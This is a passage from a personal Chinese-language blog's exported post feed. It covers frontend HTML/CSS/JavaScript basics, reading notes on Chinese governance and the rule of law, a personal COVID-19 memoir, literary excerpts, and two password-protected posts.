<p>选择文件 <input type="file" accept="image/*, text/*" name="file"> accept表示接受的文件类型</p>
<p><strong>下拉选择框</strong></p>
<p><select>&#x2F;&#x2F;下拉选择框<br>    <option value="0">请选择内容</option>&#x2F;&#x2F;选项<br>    <option value="1">请选择1</option><br>    <option value="2">请选择2</option><br></select></p>
<p><strong>表单</strong></p>
<p>&#96;<form>表单, 里面包含其他表单控件, 点击里面的提交按钮之后表单会被提交</form></p>
<p><strong>注释</strong></p>
<!-- 注释 -->

<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="在html引入css"><a href="#在html引入css" class="headerlink" title="在html引入css"></a>在html引入css</h2><h3 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="使用内部样式"><a href="#使用内部样式" class="headerlink" title="使用内部样式"></a>使用内部样式</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
            <span class="token selector">body, a</span><span class="token punctuation">&#123;</span><span class="token property">padding</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h2><ul>
<li>按照<strong>标签类型</strong>指定: h1, a, input</li>
<li>类选择器: <code>&lt;a class=&quot;highlight small&quot;&gt;example</code>, .highlight</li>
<li>id选择器 #mid</li>
</ul>
<img data-src="/2023/06/26/前端基础/1.png" style="zoom:70%;">

<img data-src="/2023/06/26/前端基础/2.png" style="zoom:70%;">

<h1 id="Javascript与DOM"><a href="#Javascript与DOM" class="headerlink" title="Javascript与DOM"></a>Javascript与DOM</h1><h2 id="JavaScript对象-函数"><a href="#JavaScript对象-函数" class="headerlink" title="JavaScript对象,函数"></a>JavaScript对象,函数</h2><img data-src="/2023/06/26/前端基础/3.png" style="zoom:70%;">

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><img data-src="/2023/06/26/前端基础/4.png" style="zoom:70%;">

<h2 id="函数调用模式与this变量"><a href="#函数调用模式与this变量" class="headerlink" title="函数调用模式与this变量"></a>函数调用模式与this变量</h2><img data-src="/2023/06/26/前端基础/5.png" style="zoom:70%;">

<img data-src="/2023/06/26/前端基础/6.png" style="zoom:70%;">

<img data-src="/2023/06/26/前端基础/7.png" style="zoom:70%;">

<h2 id="JavaScript引入html"><a href="#JavaScript引入html" class="headerlink" title="JavaScript引入html"></a>JavaScript引入html</h2><img data-src="/2023/06/26/前端基础/8.png" style="zoom:70%;">

<h2 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h2><img data-src="/2023/06/26/前端基础/9.png" style="zoom:70%;">

<h2 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h2><img data-src="/2023/06/26/前端基础/10.png" style="zoom:70%;">

<img data-src="/2023/06/26/前端基础/11.png" style="zoom:70%;">

<h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><img data-src="/2023/06/26/前端基础/12.png" style="zoom:70%;">

<h3 id="设置监听器"><a href="#设置监听器" class="headerlink" title="设置监听器"></a>设置监听器</h3><img data-src="/2023/06/26/前端基础/13.png" style="zoom:70%;">

<h3 id="DOM加载与Javascript执行时机"><a href="#DOM加载与Javascript执行时机" class="headerlink" title="DOM加载与Javascript执行时机"></a>DOM加载与Javascript执行时机</h3><img data-src="/2023/06/26/前端基础/14.png" style="zoom:70%;">

<h2 id="alert与console"><a href="#alert与console" class="headerlink" title="alert与console"></a>alert与console</h2><img data-src="/2023/06/26/前端基础/15.png" style="zoom:70%;">
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>中国国家治理的制度逻辑摘抄</title>
    <url>/2023/01/07/%E4%B8%AD%E5%9B%BD%E5%9B%BD%E5%AE%B6%E6%B2%BB%E7%90%86%E7%9A%84%E5%88%B6%E5%BA%A6%E9%80%BB%E8%BE%91%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<ul>
<li><p>中国历史上的”简约国家”形态下, 形成了”政不下县”的传统; 与此形成鲜明对比的是当代中国的人民公社时期, 其间农民被高度组织起来, 成为国家直接全面管理的对象</p>
</li>
<li><p>认同和顺从中央权威的观念制度正是提供了这样一个机制, 儒教文化在中国历史上曾长期地扮演了这一角色; 而在当代中国, 国家依靠马列主义统一执政党内部的观念</p>
</li>
<li><p>当代中国的一统观念是通过持续不断的思想教育, 政治活动, 甚至是通过官方组织的大规模的激烈的”群众活动”来不断地加以维系修补和强化的</p>
</li>
<li><p><strong>官僚组织制度</strong>和<strong>认同中央威权的观念制度</strong>是维系和延续一统体制的基本体制. 从治理的有效性来看, 这一体制是非常”成功”的. 前几天恰逢中国公布2022年人口增长数据, 2022年人口数从2021年的14.13亿下降至14.12亿。这是上世纪60年代初毛泽东“大跃进”运动后中国遭遇大饥荒以来<strong>首次人口下降</strong>。周二数据显示，去年<a href="https://cn.wsj.com/articles/CN-BCH-20220117103952">出生人口</a>从2021年的1,062万降至956万。2022年人口出生率（每千人每年出生的婴儿数）降至6.77，2021年为7.52。于是我们可以从与之有关的“计划生育政策”谈起。作为基本国策，其落实于1970年代至21世纪初，其规模之大、涉及范围之广、持续时间之长、效果之明显是中国历史上所罕见的。这一政策的实施效果也是明显的：中国人口出生率的急剧下降和独生子女的比例明显上升、特别是如今的人口下降，都是明证。</p>
<p>在其中，我们看到了高度动员的官僚组织机制。第一，从中央到各级地方政府，<strong>建立了庞大、稳定的专门计生机构，配备人员</strong>。第二，中央政府采取<strong>强大的激励机制</strong>，计生领域成为“一票否决”考核的重中之重，基层政府执行不力者将受到严厉处理，公务人员违反一胎规定会面临开除公职的危险。第三，从上到下，各级政府高度动员，分解指标，层层落实的“压力型体制”产生，每年若干次组织大规模的密集检查，而且地方政府<strong>层层加码</strong>。第四，与之相应的是<strong>大规模和持续的宣传教育活动</strong>，体现在各类单位从上而下组织的学习活动，以及各种宣传媒介的投入：电视剧、新闻报道、评先评优到街道村庄铺天盖地的标语口号。然而，我们不难看出这种一统体制中的困难与代价，大规模强力推行计生政策导致了<strong>行政成本、人力资源、社会动员、政府注意力等方面的高昂代价</strong>。这意味着，在大多数情况下，<strong>一统体制欲强有力地推行其政策只能是有选择、局部的、暂时的。</strong></p>
<p>(这样看来，前不久的0 covid政策居然和此有如此相同的逻辑内核)</p>
</li>
<li><p>具体地来说，一统体制的挑战主要有以下几点。首先，一统体制的核心机制是“政令自中央出”，而一统决策权的特点必然是“<strong>一刀切”</strong>。在许多情况下，这种举国体制一以贯之的做法不仅代价昂贵、难以为继，而且常常诱发重大灾难。比如“大跃进”和“文革”。国土之大，发展之不平衡、文化之差异，对一统的政策制定和实施实在是一个严峻的挑战。</p>
<p>其次，<strong>组织的局限性</strong>。交易成本学派曾提出：如果正式组织可以提高效率、降低交易成本，那么，为什么整个国家的经济活动不能置放在一个大的正式组织中？20世纪社会主义国家计划经济的失败即是明证。交易成本经济学理论指出，随着社会复杂化程度增加，管理成本和协调成本急剧提高。</p>
</li>
<li><p>作为所有权利集于一身的中央政府，主要需要完成两项基本任务：一是为广大百姓提供基本的公共服务，维持政权的长期稳定；二是保证下放给行政代理人的权力不被滥用，中央的政令能够畅通无阻。这两项任务本质上是冲突的：为了给百姓更好的服务，必须尽可能把权力下放给更了解当地民众的基层政府；但另一方面，权力的下放意味着有被滥用甚至架空的危险。</p>
</li>
</ul>
<h1 id="“一统体制与有效治理”矛盾的应对机制"><a href="#“一统体制与有效治理”矛盾的应对机制" class="headerlink" title="“一统体制与有效治理”矛盾的应对机制"></a>“一统体制与有效治理”矛盾的应对机制</h1><hr>
]]></content>
      <categories>
        <category>中国国家治理的制度逻辑摘抄</category>
      </categories>
  </entry>
  <entry>
    <title>奥威尔与赫胥黎之争</title>
    <url>/2023/01/26/%E5%A5%A5%E5%A8%81%E5%B0%94%E4%B8%8E%E8%B5%AB%E8%83%A5%E9%BB%8E%E4%B9%8B%E4%BA%89/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f32af45a7459e535ed40ba4c98253a0951a119c742a9488087157d0c4af3fc61">165d50f05814027fb7fe5e4ae8a088d87abb8fd8cf0ea37b0884bd86e6b55f15c5ff65a637624079f726550d7abe6127ee7c48c48a34d03e7eb930209fd089eb1e1de91c2804f379140b6af17c6ae6f29ec4d49a93a0f99a8266bbd61da51e1b</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是123</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>社会学</category>
      </categories>
      <tags>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title>我的疫情记忆</title>
    <url>/2023/01/20/%E6%88%91%E7%9A%84%E7%96%AB%E6%83%85%E8%AE%B0%E5%BF%86/</url>
    <content><![CDATA[<h1 id="李文亮医生"><a href="#李文亮医生" class="headerlink" title="李文亮医生"></a>李文亮医生</h1><p>谈到这三年的疫情，第一个关键词应该是”李文亮医生”。</p>
<p>2019年12月30日下午，李文亮在同学群里发信息：“华南水果海鲜市场确诊了7例SARS。在武汉市中心医院后湖院区急诊科隔离。”一个小时后，他又在群里补充，“最新消息是冠状病毒感染确定了，正在进行病毒分型”。</p>
<img data-src="/2023/01/20/我的疫情记忆/1.png" style="zoom:80%;">

<p>消息发出后，1月3日，武汉警方找到李文亮，要求他签下训诫书——“依法对你在互联网上发表不属实的言论的违法行为提出警示和训诫……”武汉警方事后称，当时进行了教育、批评，未给予警告、罚款、拘留的处罚。</p>
<p>后来李文亮医生被感染，医治无效而辞世, 引发大规模的人群悼念.</p>
<img data-src="/2023/01/20/我的疫情记忆/2.png" style="zoom:80%;">

<p>很遗憾, 我当时正处于高三的重压与疫情的心理折磨, 有关李文亮医生, 都是在他去世以后知道的.</p>
<p>我怀着一种怅然若失地感觉翻看了他的微博，他喜欢庆余年，转发各种抽奖微博，喜欢吃德克士炸鸡腿、鸡蛋灌饼、火锅、日料。有一天他下班去逛超市，看见158一斤的车厘子，他发微博半开玩笑地说“吃不起”。他的最后一条动态发布于2020年2月1日，说自己“尘埃落定，终于确诊”。但此后三年，无数的网友来到他的微博，留下细碎的句子，或是自己开心的不开心的经历、或是对李文亮医生的怀念，很快被淹没在留言中。</p>
<p>我想起那个时候的日子，在晚上，我站在阳台上，世界安静极了，没有一辆车的呼啸，连犬吠鸡鸣也听不见，更无人声，惟一排排矗立的路灯若无其事地散发暗黄色光。我那时想，这样的情形此生怕是仅此一次了。那时候，疫情于我而言，是远方飘渺的鬼厉，我沉浸与当时的安宁与平静，没有想过在1000公里外的武汉，正在经历着不可言说的苦难与绝望。</p>
<img data-src="/2023/01/20/我的疫情记忆/3.png" style="zoom:80%;">

<p>直到今天, 无数的人, 依然在这座”哭墙”上留下自己生命的点滴</p>
<h1 id="全国封城"><a href="#全国封城" class="headerlink" title="全国封城"></a>全国封城</h1><p>2020年2月到4月，全国各个城市都经历过一次封城</p>
<img data-src="/2023/01/20/我的疫情记忆/4.png" style="zoom:80%;">

<p><a href="http://www.bjnews.com.cn/feature/2020/02/08/686501.html">重庆所有小区实行封闭式管理 每户定期派1人外出采购</a></p>
<p>那个时候，在重庆，每户每天有一个人可以出去采购，没有限制时间。但是这项规定很快就被取消了，并没有强制限制大家的自由。出于对新病毒的恐惧，大部分人都很配合地呆在家里。物资也没有短缺，药也可以买到。</p>
<p>这次封城，与后来的各种“非必要..”政策相比，简直是小巫见大巫</p>
<h1 id="高考延期"><a href="#高考延期" class="headerlink" title="高考延期"></a>高考延期</h1><p>我记得那天在上网课，上午十点，有同学在微信群里转发了高考延期的通知，引发了大家极为热烈的讨论，微信群从未这样热火朝天，大家也都无心上课了。</p>
<img data-src="/2023/01/20/我的疫情记忆/5.png" style="zoom:80%;">

<h1 id="返校-高考"><a href="#返校-高考" class="headerlink" title="返校  高考"></a>返校  高考</h1><p>2020年4月20日，重庆市高三学生返校线下上课。没有人想到，这寒假一放就是4个月。我坐高铁到了沙坪坝，那个时候还没有核酸阴性证明，没有行程码健康码，一切看起来畅通无阻。我们在学校门口排好队，保安提着消毒液给我们的行李消毒。在学校，除了睡觉的时间都是带着口罩的，食堂的座位上贴上了每个人的名字，固定分批就餐，班主任每日给我们三次测温。</p>
<p>大概坚持了一个月，后来的管控就渐渐放松了，班里也没人戴口罩了。除了上自习的时候，一半的人得去楼上空教室，其它似乎与正常的高三生活无异了</p>
<p>虽然延期了一个月，但是很快高考的时间还是到了.全年级的老师都穿上红色的衣服在楼下给我们打气. 高考那两天就像任何一次模拟考一样稀松平常. 除了在英语考试结束的前十分钟, 我写完最后一个单词, 突然意识到高考, 三年高中终于要结束了. 内心充满着激动与高兴.</p>
<h1 id="战时状态"><a href="#战时状态" class="headerlink" title="战时状态"></a>战时状态</h1><p>在第一次封城后到冬天之间的日子，大部分城市都过着疫情前一样正常的生活。中国甚至有好一段时间，全国都没有一例新增</p>
<p>在我去北京上大学的时候，也只需要出示7天以内的核酸阴性证明</p>
<p>在大学，开学的前两周被封在学校，但是大一上的剩下的日子都相对自由</p>
<p>很快到了冬天，那是北京70年以来最冷的一个冬天，被我一个从来没有感受过零下气温的初来乍到的南方人赶上，在上学放学的路上，我每天都和严寒做着心理上和生理上的顽强对抗，最终被冻得一败涂地</p>
<p>不仅是我的冬天，那个冬天对很多城市也异常”寒冷”。2020年12月8日，因为成都两天新增六确诊，四川首先发出<a href="http://news.hnr.cn/202012/08/165251.html">四川省委书记彭清华：迅速进入战时状态，把影响控制在最小范围</a>的新闻。”战时状态”在疫情期间第一次被提出。</p>
<p>多地紧随其后，时髦地使用”战时状态”</p>
<ul>
<li>12月10日，<a href="https://zh.wikipedia.org/wiki/%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81">黑龙江省</a><a href="https://zh.wikipedia.org/wiki/%E7%89%A1%E4%B8%B9%E6%B1%9F%E5%B8%82">牡丹江市</a><a href="https://zh.wikipedia.org/wiki/%E4%B8%9C%E5%AE%81%E5%B8%82">东宁市</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BB%A5%E8%8A%AC%E6%B2%B3%E5%B8%82">绥芬河市</a>各新增1例本土确诊病例。随后，东宁市启动《新冠肺炎疫情控制应急预案》，东宁市各高速公路收费站实施交通管制措施，非必要不可外出。受此影响，哈尔滨市、绥化市、伊春市等多地将幼儿园、中小学寒假时间提前至2021年元旦前后。12月12日，东宁市按照市疫情防控预案进入<strong>战时状态</strong>，提升管控措施级别</li>
<li>12月20日，大连出现疫情复发现象，进入疫情防控<strong>战时状态</strong></li>
<li>12月26日，<a href="https://zh.wikipedia.org/wiki/%E5%8C%97%E4%BA%AC%E5%B8%82">北京市</a><a href="https://zh.wikipedia.org/wiki/%E9%A1%BA%E4%B9%89%E5%8C%BA">顺义区</a>因近日出现的疫情复发现象进入<strong>战时状态</strong></li>
<li>1月3日，因2日河北省<a href="https://zh.wikipedia.org/wiki/%E7%9F%B3%E5%AE%B6%E5%BA%84%E5%B8%82">石家庄市</a><a href="https://zh.wikipedia.org/wiki/%E8%97%81%E5%9F%8E%E5%8C%BA">藁城区</a>报告新增本土确诊病例, 石家庄市进入<strong>战时状态</strong></li>
<li>1月5日，全河北省进入<strong>战时状态</strong></li>
<li>1月12日，正在北京开会的黑龙江省委书记<a href="https://zh.wikipedia.org/wiki/%E5%BC%B5%E6%85%B6%E5%81%89">张庆伟</a>专程请假返黑，连夜主持召开会议，宣布全省进入紧急状态</li>
</ul>
<p>全面的核酸检测也是在这个时候被河北省提出并纳用的</p>
<ul>
<li>1月6日，石家庄市和邢台市全面开展<strong>全员核酸检测</strong></li>
<li><strong>1月13日，中国大陆新增138宗确诊病例，新增1宗死亡病例。这是自2020年5月17日以来，时隔242天，中国大陆再次出现死亡病例</strong></li>
</ul>
<h1 id="疫苗接种"><a href="#疫苗接种" class="headerlink" title="疫苗接种"></a>疫苗接种</h1><p>进入2021年3月，中国大陆各省开始推动大规模疫苗接种。自2021年3月23日起，国家卫健委宣布将每日公布<a href="https://zh.wikipedia.org/wiki/2019%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E7%97%85%E7%96%AB%E8%8B%97">2019冠状病毒病疫苗</a>的接种数量。同时，随着国内第二轮疫情的基本平息，中国大陆政府的防疫中心又返回到外防输入、内防反弹的路线上。</p>
<p>中国大陆多地纷纷悬挂标语吸引民众接种疫苗，主要标语包括“我们一起打疫苗，一起苗苗苗苗苗”、“建立全民免疫，需要你一‘臂’之力”、“2021年头等大事，就是接种新冠疫苗”、“防疫道路千万条，接种疫苗第一条”、“朋友一生一起走，先打疫苗再聚首”、“每个人的身上都有苗苗，让我为你打苗苗”等。《<a href="https://zh.wikipedia.org/wiki/%E6%96%B0%E4%BA%AC%E6%8A%A5">新京报</a>》评论认为，这些标语的文本体现出的是一种平等尊重、欢迎公众参与的价值观，没有居高临下和刻板说教，相信当地社区的居民相约去打疫苗时，提到这条标语也会会心一笑</p>
<p>但是就我个人的经历而言, 我记得在21年暑假的某一段时间, 重庆市政府推出了”二码联查”政策, 也就是出入公共场合要同时出示健康码和疫苗接种码, 甚至出入小区也会有保安阻拦查验. 我仍然记得社区的书记发布的通告”不接种疫苗的老年人将被取消养老金的发放”, 我也记得各级初等学校发布的通知”开学时凭借学生本人甚至全家的疫苗接种证明返校, 未完成者, 不得返校”. 我想在当时, 这一幕幕相似的经历, 应当在全国各地都在上演, 于是我国疫苗覆盖率突飞猛进:</p>
<img data-src="/2023/01/20/我的疫情记忆/6.png" style="zoom:80%;">

<p>从流行病防控学的观点看，接种疫苗是相当有必要的(当然在2023年的今天，大部分专家和民众都已经意识到，由于新冠病毒极强的变异率，我们的疫苗研发的速度要远远落后于病毒变异的速度)，但是对推行一项措施所采用的无所不用其极的手段，却让我异常反感。我犹记得新冠疫苗刚上市时官方发布的一页长长的禁忌，但是到后期，无论你有什么慢性病，医生(甚至社区工作人员)都会大言不惭地说没有禁忌。人民群体是不存在记忆的，但是个体存在。出于对这些的厌恶和抵触、以及本身对疫苗保护效力的怀疑，我始终没有接种疫苗。一年半以后我不幸阳了，和无数接种过疫苗的人一样。最终我还是产生抗体了，最新版本的</p>
<img data-src="/2023/01/20/我的疫情记忆/7.jpg" style="zoom:110%;">

<h1 id="动态清零"><a href="#动态清零" class="headerlink" title="动态清零"></a>动态清零</h1><p>12月1日，国家卫生健康委主任马晓伟接受新华社记者采访时表示，中国大陆疫情防控已进入第三阶段。其中，第一阶段是<strong>突发疫情应急围堵</strong>阶段；第二阶段是<strong>常态化防控探索</strong>阶段；第三阶段是<strong>全链条精准防控的“动态清零”阶段</strong></p>
<p>疫苗的接种率越来越高，从最早的8%一直到80%，90%，我们没有迎来专家说的群体免疫。这篇土地仍然时不时因为疫情而被封锁。</p>
<p>然后到了2022年，疫情最艰难的一年，对中国所有人。</p>
<p>3月15日，国务院联防联控机制召开发布会，会上国家卫生健康委新闻发言人、宣传司副司长米锋介绍中国大陆疫情形势，称自3月以来，中国大陆疫情发生频次明显增加，感染人数快速增长，波及范围不断扩大，已波及28个省份，形容疫情防控难度加大，防控形势严峻复杂。国家卫生健康委疾控局副局长、一级巡视员<a href="https://zh.wikipedia.org/w/index.php?title=%E9%9B%B7%E6%AD%A3%E9%BE%99&action=edit&redlink=1">雷正龙</a>对本次大规模暴发进行了详细分析。他表示，2022年3月以来，境外输入疫情引发的本土疫情发生频次明显增加，波及范围不断扩大。3月1日至14日，本土疫情累计报告感染者已经超过15000例，吉林、山东、上海、广东、河北等地疫情还在发展中，部分地区的疫情上升速度较快，社会面传播扩散和外溢风险比较高，各地方正加快风险人员筛查、转运、隔离等工作。本次大规模暴发呈现出点多、面广、频发的特点</p>
<p><strong>3月18日，吉林通报有2起COVID-19本土死亡病例，是自2021年1月以来中国大陆再度出现本土死亡病例</strong></p>
<p>然后到了四月, “4月7日0-24时，中国大陆单日新增2019冠状病毒病感染病例连续第三天破两万，并再次突破<a href="https://zh.wikipedia.org/wiki/2019%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E7%97%85%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%E7%96%AB%E6%83%85">2019冠状病毒病中国大陆疫情</a>的最高日增感染病例记录，单日新增感染者达24224例，其中本土感染病例达24101例。感染病例多数集中在<a href="https://zh.wikipedia.org/wiki/%E4%B8%8A%E6%B5%B7%E5%B8%82">上海市</a>，当日0-24时该市新增感染者达21222例”</p>
<p>之后的记忆越来越清晰, 也越来越和我有关</p>
<p>根据<a href="https://zh.wikipedia.org/wiki/%E9%87%8E%E6%9D%91%E8%AF%81%E5%88%B8">野村证券</a>的经济学家估计，截至4月11日，中国有45座城市的<strong>大约3.73亿人处于全面或部分封控状态</strong>，这些城市的人口占中国总人口的26%，经济产出占中国总产出的40%。</p>
<p>后来上海疫情爆发，有人记录下上海四月的各种纪实对话发布到网上，是为“四月之声”。引起极大反响，迅速遭到全面禁封。越来越多的人开始怀疑和反思，继续严格的封控是否真的可持续。5月5日，中共中央政治局常务委员会召开会议，习近平表示要坚持动态清零，坚决同一切歪曲、怀疑、否定中国防疫方针政策的言行作斗争。</p>
<p>然后完全是我的记忆了。</p>
<p>北京的疫情从四月底开始，每况愈下，流言纷飞，</p>
<hr>
<p>动态清零的部分搁置了好久, 每每回想起那一部分记忆, 依然觉得难受而荒谬. 我无权代替所有遭受苦难的人记录这一段生活, 我只能诉说一个细微个体的浮沉</p>
<p>我被疫情深深影响是从四月份开始的, 最初传闻北京某中学确诊70例阳性, 然而无官方报道, 我也没有重视. 后来北京疫情每况愈下, 学校在劳动节开始封校. 大家人心惶惶, 每日下午锁定北京卫健委的新闻发布会. 尽管采取了极其严厉的封锁, 北京在五月一整月都雷打不动每日新增50+. 当时学校一旦有疫情, 整个学校直接封寝, 依稀记得全市985高校几乎无一幸免(为什么没提211及其以下呢, 因为当时北京市的防疫政策是全国最严的, 非985北京高校根本不准线下开学)</p>
<p>我还记得一个一公里见方的学校内部被一道一道的铁皮与护栏划分成一块一块, 仿佛这些就能把病毒颗粒与学校内部隔绝.</p>
<img data-src="/2023/01/20/我的疫情记忆/8.jpg" style="zoom:80%;">

<p>我的心也被这铁皮划分成一块一块, 我不觉得我们在做任何伟大的事, 我只为2022年发生的事情而感到悲哀.</p>
<p>我看到公众号上的一段话</p>
<pre class="line-numbers language-none"><code class="language-none">我是从去年一二月就放寒假回家的大学生，因为疫情，我已经放了五个月的假了，封在家里的时光确实让我很受折磨。
旅游对我来说是一件很重要的事，去外面看看云朵飘，看看水在我面前流过，是我能想象到最美好的事。虽然说不应该给国家添麻烦，但我也真的不希望在这个年纪禁锢自己<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我已经丢失了太多</p>
<p>后来北京市让绝大部分高校学生返乡, 然后我被隔离了八天, 不表</p>
<p>(好难继续写下去, but i’ll try)</p>
<p>就这样吧 不想写了</p>
]]></content>
      <categories>
        <category>covid 19</category>
      </categories>
      <tags>
        <tag>记忆</tag>
      </tags>
  </entry>
  <entry>
    <title>选课网站</title>
    <url>/2023/01/13/%E6%89%92%E4%B8%80%E6%89%92buaa%E7%9A%84%E9%80%89%E8%AF%BE%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="72f2162fa85d77626a69543e74bd20b71932bdee8d68540c00f03bf1b2e2e63c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是123</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>选课</tag>
      </tags>
  </entry>
  <entry>
    <title>法治的细节</title>
    <url>/2023/05/14/%E6%B3%95%E6%B2%BB%E7%9A%84%E7%BB%86%E8%8A%82/</url>
    <content><![CDATA[<ul>
<li>柏拉图眼中, 最理想的政体就是精英式的贵族政体, 也被称为王政. 柏拉图认为, 只有让王成为哲学家, “哲学王”被授予绝对的权力, 才能建立王道乐土的美丽新世界, 国家会充满智慧和勇气. 而柏拉图最瞧不上的就是军事独裁的僭主政体.</li>
<li>柏拉图三次去往叙拉古, 他在&lt;法律篇&gt;中终于意识到: 只有法治才是现实的. 哲学王的统治不具有现实可能性, 如果追求最优选项, 反而会导致最坏的结果, 法治虽然不是最好的选择, 也是一个避免最坏结果的”次优”选项</li>
<li>阿克顿勋爵说:”权力导致腐败, 绝对权力导致绝对腐败”</li>
<li>如果法律只是一种工具, 权力的滥用也就不可避免, 人治可以打着法律的名义大行其道, 人也就不可能拥有真正的自由</li>
<li>to be continued…</li>
</ul>
]]></content>
      <categories>
        <category>摘抄</category>
      </categories>
      <tags>
        <tag>摘抄</tag>
      </tags>
  </entry>
  <entry>
    <title>摘抄</title>
    <url>/2023/03/27/%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<p>2024.2023.3.27</p>
<h1 id="离婚-老舍"><a href="#离婚-老舍" class="headerlink" title="离婚 老舍"></a>离婚 老舍</h1><ul>
<li>除了北平人都是乡下佬. 天津, 汉口, 上海, 连巴黎, 伦敦, 都算在内, 通通是乡下</li>
</ul>
<h1 id="1984"><a href="#1984" class="headerlink" title="1984"></a>1984</h1><ul>
<li>极权主义本质上与古代或中世纪的专制主义并无不同. 极权主义有过之而无不及的地方在于, 极权主义掌握了现代政治的统治手段, 包括政治组织, 社会生活, 舆论工具, 艺术创作, 历史编纂甚至个人思想和隐私, 无不在一个有形和无形的”老大哥”的全面严密控制下</li>
<li>没有什么事情是不合法的, 因为早已不再有什么法律了</li>
<li>果尔德史坦因是个叛徒, 变节分子, 他一度是党的领导人物之一, 几乎与老大哥本人平起平坐, 后来从事反革命活动, 被判死刑</li>
<li><strong>他在谩骂老大哥, 攻击党的专政, 要求立即同欧亚媾和, 主张言论自由, 新闻自由, 集会自由, 思想自由, 歇斯底里地嚷说革命被出卖了</strong></li>
<li>仇恨刚进行了三十秒钟, 屋子里一半人就爆发出不可控制的愤怒的呐喊, 电幕上洋洋自得的羊脸, 羊脸后面欧亚国可怕的威力,这一切使人无法忍受; 此外, 就凭果尔德史坦因的脸, 或者哪怕只想到它这个人, 就自动地产生愤怒和恐惧. 尽管这样, 他的影响似乎从来没有减弱过. <strong>总有”傻瓜”上当受骗. 所以应该只重复他是反革命分子, 而不要提及他的言论</strong></li>
<li>因为每星期”泰晤士报”总有一条消息报道有个偷听父母讲话的小密探–一般都被称为”小英雄”–偷听到了父母的一些见不得人的话, 向思想警察作了揭发</li>
</ul>
<h1 id="BraveNewWorld"><a href="#BraveNewWorld" class="headerlink" title="BraveNewWorld"></a>BraveNewWorld</h1><ul>
<li>“and Delta Children wear khaki. Oh no, I don’t want to play with Delta children. And Epsilons are still worse. They’re too stupid to be able to read or write. Besides they wear black, which is such a beastly colour. I’m so glad I’m a Beta”</li>
